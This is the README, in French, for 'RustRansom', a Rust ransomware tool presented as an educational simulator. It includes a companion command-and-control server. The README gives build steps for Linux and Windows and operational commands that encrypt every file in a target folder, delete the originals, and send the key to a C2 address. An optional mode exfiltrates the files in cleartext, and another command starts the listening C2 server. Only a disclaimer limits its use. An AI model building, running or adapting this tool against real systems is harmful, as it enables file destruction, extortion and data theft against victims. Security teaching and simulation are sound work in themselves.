# RustRansom

![RustRansom Banner](RustRansom.png)

RustRansom est un simulateur de ransomware écrit en Rust, développé à des fins éducatives et de démonstration. Le projet se compose de deux parties principales :

- **Client RustRansom**  
  Ce programme chiffre les fichiers d’un répertoire cible en utilisant AES-256-GCM, crée un fichier `readme.txt` avec la clé de récupération et des instructions, envoie la clé au serveur de Command & Control (C2) et, en option, exfiltre les fichiers chiffrés (les déchiffre en mémoire avant de les envoyer en clair).

- **Serveur C2 (RustRansom C2 Server)**  
  Un serveur HTTP léger basé sur Warp qui reçoit la clé de chiffrement et les fichiers exfiltrés. Les fichiers reçus sont sauvegardés dans le dossier `exfiltrated_files`.

## Caractéristiques

- **Chiffrement sécurisé** : Utilisation d'AES-256-GCM pour chiffrer les fichiers.
- **Déchiffrement** : Récupération des fichiers via la clé de chiffrement.
- **Exfiltration** : En option, les fichiers chiffrés sont déchiffrés en mémoire et envoyés en clair au serveur C2.
- **Création de Readme** : Génération d'un fichier `readme.txt` dans le répertoire cible, incluant une bannière, la clé de récupération et des instructions pour déchiffrer les fichiers.
- **Multi-plateforme** : Compatible Windows et Linux (via compilation native ou cross-compilation).

## Prérequis

- [Rust](https://www.rust-lang.org/tools/install) (version stable)
- (Optionnel) Pour cross-compiler vers Windows depuis Linux :
  ```sh
  rustup target add x86_64-pc-windows-gnu
  sudo apt-get install gcc-mingw-w64-x86-64
  ```

## Installation et Compilation

Clonez le projet :

```bash
git clone https://github.com/votre-utilisateur/rustransom.git
cd rustransom
```

### Compilation pour Linux

```bash
cargo build --release
```

Les exécutables se trouvent dans `target/release/` :
- Client : `rustransom_client`
- Serveur : `rustransom_server`

### Compilation pour Windows (cross-compilation depuis Linux)

```bash
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu
```

Les exécutables Windows seront dans `target/x86_64-pc-windows-gnu/release/` :
- Client : `rustransom_client.exe`
- Serveur : `rustransom_server.exe`

## Utilisation

### Client RustRansom

#### Chiffrement

Pour chiffrer un dossier et envoyer la clé au serveur C2 :

```bash
./rustransom_client -e -t /chemin/vers/dossier -s 127.0.0.1 -p 8080 -x
```

Options :
- `-e` : Active le mode chiffrement.
- `-t <dossier>` : Répertoire cible.
- `-s <C2_IP>` : Adresse IP du serveur C2 (par défaut 127.0.0.1).
- `-p <PORT>` : Port du serveur C2 (par défaut 8080).
- `-x` : Active l'exfiltration (les fichiers sont déchiffrés en mémoire et envoyés en clair).
- `-c` : Conserve une copie des fichiers originaux après chiffrement.

Pendant le chiffrement, le client :
- Chiffre tous les fichiers du dossier cible (les fichiers originaux sont supprimés si `-c` n'est pas spécifié).
- Génère un fichier `readme.txt` dans le dossier cible qui contient :
  - La bannière ci-dessus,
  - Le message : "Tous vos fichiers ont été chiffrés par RustRansom! Mais ne vous inquiétez pas, vous pouvez toujours les récupérer avec la clé de récupération.",
  - La clé de récupération,
  - La commande à utiliser pour déchiffrer les fichiers,
  - La liste des fichiers chiffrés.
- Envoie la clé de récupération au serveur C2.
- Si `-x` est activé, chaque fichier chiffré est déchiffré en mémoire et envoyé en clair au serveur C2 via l'endpoint `/files/<nom>`.

#### Déchiffrement

Pour déchiffrer les fichiers dans un dossier :

```bash
./rustransom_client -d -t /chemin/vers/dossier -k <clé_de_récupération>
```

Options :
- `-d` : Active le mode déchiffrement.
- `-t <dossier>` : Répertoire cible.
- `-k <clé>` : Clé de récupération (format hexadécimal, 64 caractères).

#### Affichage de l'aide

```bash
./rustransom_client -h
```

### Serveur C2 (RustRansom C2 Server)

Pour lancer le serveur C2 :

```bash
./rustransom_server -i 0.0.0.0 -p 8080
```

Options :
- `-i <IP>` : Adresse IP sur laquelle écouter.
- `-p <PORT>` : Port d'écoute.

Pour afficher l'aide :

```bash
./rustransom_server -h
```

## Avertissement

Ce projet est destiné à des fins éducatives uniquement. Son utilisation non autorisée ou malveillante est strictement interdite. Utilisez-le dans un environnement de test et obtenez toujours les autorisations nécessaires avant d'effectuer des tests sur des systèmes réels.

## Contribuer

Les contributions sont les bienvenues ! Veuillez ouvrir une issue ou soumettre une pull request pour proposer des améliorations ou des corrections.

## Licence

Ce projet est sous licence MIT. Consultez le fichier [LICENSE](LICENSE) pour plus de détails.
